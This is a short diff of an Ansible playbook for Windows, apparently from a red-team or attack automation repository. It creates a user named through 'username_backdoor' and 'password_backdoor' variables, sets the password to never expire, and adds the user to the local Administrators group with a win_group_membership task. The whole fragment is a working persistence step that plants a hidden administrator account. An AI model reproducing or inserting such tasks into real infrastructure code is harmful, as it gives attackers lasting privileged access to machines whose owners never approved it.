@@ -29,7 +29,12 @@
           win_user:
            name: '{{ username_backdoor }}'
            password: '{{ password_backdoor }}'
-           groups: Administrators
            password_never_expired: yes
+        - name: Add a local and domain user to a local group
+          win_group_membership:
+            name: Administrators
+            members:
+              - '{{ username_backdoor }}'
+            state: present
 
 
